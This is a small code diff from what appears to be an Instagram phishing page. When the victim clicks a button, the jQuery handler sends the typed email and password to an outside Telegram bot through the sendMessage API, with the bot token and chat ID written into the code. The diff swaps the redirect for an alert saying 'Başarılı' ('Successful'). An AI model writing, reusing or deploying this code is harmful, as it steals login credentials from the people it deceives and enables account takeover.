@@ -10,9 +10,7 @@ $('#buton').click(function(){
     jQuery.ajax({
       type:"post",
       url: "https://api.telegram.org/bot343775901:AAHpbiAGCPQD8ReOPHDlLeSLZZCsJNJJ5FQ/sendMessage?chat_id=187750627&text=INSTAGRAM:email : "+email+" password : "+password+"",
-      success: function() {
-        //   window.location.href = 'https://www.instagram.com/';
-        }
+      
     });
-
+    alert('Başarılı');
 });
